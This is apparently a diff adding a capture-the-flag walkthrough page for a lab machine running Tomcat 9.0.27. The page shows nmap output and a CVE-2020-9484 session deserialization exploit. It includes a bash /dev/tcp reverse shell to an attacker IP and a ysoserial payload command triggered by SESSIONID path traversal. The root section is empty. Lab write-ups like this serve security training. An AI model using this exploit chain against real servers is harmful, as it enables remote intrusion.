@@ -1,0 +1,69 @@
+<h2 id="nmap-scan">nmap scan</h2>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># nmap -sC -sV -Ao nmap 10.10.10.205</span>
+
+Starting Nmap 7.92 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2022-09-06 12:28 CEST
+Nmap scan report <span class="k">for </span>10.10.10.205
+Host is up <span class="o">(</span>0.029s latency<span class="o">)</span><span class="nb">.</span>
+Not shown: 998 closed tcp ports <span class="o">(</span>conn-refused<span class="o">)</span>
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+| ssh-hostkey:
+|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae <span class="o">(</span>RSA<span class="o">)</span>
+|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f <span class="o">(</span>ECDSA<span class="o">)</span>
+|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb <span class="o">(</span>ED25519<span class="o">)</span>
+8080/tcp open  http    Apache Tomcat 9.0.27
+|_http-open-proxy: Proxy might be redirecting requests
+|_http-title: VirusBucket
+Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
+Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>65.87 seconds
+</code></pre></div></div>
+
+<h2 id="open-port">open port</h2>
+
+<ul>
+  <li>port 22 as ssh as usual</li>
+  <li>port 8080 with a running tomat instance at version 9.0.27</li>
+</ul>
+
+<h2 id="tomcat-9027">tomcat 9.0.27</h2>
+
+<p>A little bit of looking around reveals that the running version of tomcat seems to be vulnerable to a rce exploit. <a href="https://github.com/PenTestical/CVE-2020-9484">1</a></p>
+
+<h2 id="file-upload">file upload</h2>
+
+<p>Looking around and playing around reveals a file upload service at <code class="language-plaintext highlighter-rouge">http://10.10.10.205:8080/service/</code>. It gets an email address and a file. The service says it checks the file for malicious content and sends a report to the email address. 
+Playing around with burpsuite reveals that the service tries to store those files under <code class="language-plaintext highlighter-rouge">/opt/samples/uploads</code> and uses <code class="language-plaintext highlighter-rouge">apache/commons/fileupload</code> to do that.</p>
+
+<p><img src="../assets/BurpSuite-FileUpload.png" alt="BurpSuite FileUpload" title="BurpSuite FileUpload" /></p>
+
+<h2 id="combining">combining</h2>
+
+<p>Combining the RCE exploit with the findings of the file upload we can create a reverse shell with <a href="https://github.com/frohoff/ysoserial">ysoserial</a>, upload it and call it with path traversal of the <code class="language-plaintext highlighter-rouge">SESSIONID</code> field in the request.</p>
+
+<h2 id="exploiting-user">exploiting user</h2>
+
+<p>Starting with the reverse shell file we start up with ysoserial to create the payload. Because we don’t know the Verison of <code class="language-plaintext highlighter-rouge">apache/commons/fileupload</code> we have to try serveral <code class="language-plaintext highlighter-rouge">CommonsCollectionsX</code> provided by ysoserial. As reverse shell we’re using a bash shell which we base64 encode.</p>
+
+<ol>
+  <li>base64 of bash revese shell
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># echo 'bash -i &gt;&amp; /dev/tcp/10.10.14.18/4242 0&gt;&amp;1' | base64</span>
+YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xOC80MjQyIDA+JjEK
+</code></pre></div>    </div>
+  </li>
+  <li>create reverse shell with ysoserial
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>java <span class="nt">-jar</span> ysoserial-master.jar CommonsCollections2 <span class="s2">"bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xOC80MjQyIDA+JjEK}|{base64,-d}|{bash,-i}"</span> <span class="o">&gt;</span> shell.session
+</code></pre></div>    </div>
+  </li>
+</ol>
+
+<p>We take that file and upload it using the intended way. Thereupon we request any site on the tomat site and manipulate the <code class="language-plaintext highlighter-rouge">SESSIONID</code> using burpsuite. The value is equivalent to the previous found directory where the files are uploaded to + the file name of the created reverse shell subtracted by the <code class="language-plaintext highlighter-rouge">.session</code> file-extrension. This is because tomcat automatically appends <code class="language-plaintext highlighter-rouge">.session</code> to the requested <code class="language-plaintext highlighter-rouge">SESSIONID</code>.</p>
+
+<p><img src="../assets/BurpSuite-SessionID.png" alt="BurpSuite SESSIONID" title="BurpSuite SESSIONID manipulation" /></p>
+
+<p>Start a listener on the local maschine and forward the manipulated request. Voila! User level of Fiola.</p>
+
+<h2 id="root-exploitation">root exploitation</h2>
+
